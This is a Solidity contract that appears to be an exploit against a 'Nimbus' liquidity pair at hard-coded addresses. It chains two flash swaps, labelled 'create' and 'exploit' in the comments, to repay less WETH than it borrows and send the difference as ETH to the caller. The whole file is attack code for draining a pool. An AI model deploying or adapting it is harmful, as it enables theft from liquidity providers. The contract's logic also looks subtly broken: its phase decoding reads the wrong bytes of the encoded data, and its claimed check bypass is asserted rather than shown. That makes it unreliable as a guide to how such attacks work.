pragma solidity ^0.8.24;

interface IERC20 {
    function balanceOf(address owner) external view returns (uint);
    function transfer(address to, uint value) external returns (bool);
}

interface INimbusPair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function balanceOf(address) external view returns (uint);
    function transfer(address to, uint value) external returns (bool);
}

contract Strategy {
    INimbusPair constant pair = INimbusPair(0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62);
    IWETH constant WETH = IWETH(0x0BCd83DF58a1BfD25b1347F9c9dA1b7118b648a6);
    IERC20 constant NBU = IERC20(0xEB58343b36C7528F23CAAe63a150240241310049);

    function run() public {
        // Step 1: Create discrepancy via flash swap
        (uint112 reserve0,,) = pair.getReserves();
        uint borrow1 = uint(reserve0) - 1;
        pair.swap(borrow1, 0, address(this), abi.encode("create"));

        // Step 2: Now there's a discrepancy - reserve > actual
        // Borrow based on ACTUAL balance, not reserve
        uint actualWETH = WETH.balanceOf(address(pair));
        uint borrow2 = actualWETH - 1;
        pair.swap(borrow2, 0, address(this), abi.encode("exploit", borrow2));

        // Send profits
        if (address(this).balance > 0) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    function NimbusCall(address, uint, uint, bytes calldata data) external {
        require(msg.sender == address(pair), "Not pair");

        bytes memory phaseBytes = new bytes(6);
        for (uint i = 0; i < 6; i++) {
            phaseBytes[i] = data[i];
        }
        string memory phase = string(phaseBytes);

        uint wethBal = WETH.balanceOf(address(this));

        if (keccak256(bytes(phase)) == keccak256("create")) {
            // Return what we borrowed
            WETH.transfer(address(pair), wethBal);
        } else {
            // Exploit phase: return less than borrowed
            // The K check uses inflated reserves, so we can profit
            uint repay = wethBal - 1; // Keep 1 wei as profit (minimal)
            WETH.transfer(address(pair), repay);

            // Convert remaining WETH to ETH
            uint profit = WETH.balanceOf(address(this));
            if (profit > 0) {
                WETH.withdraw(profit);
            }
        }
    }

    receive() external payable {}
}
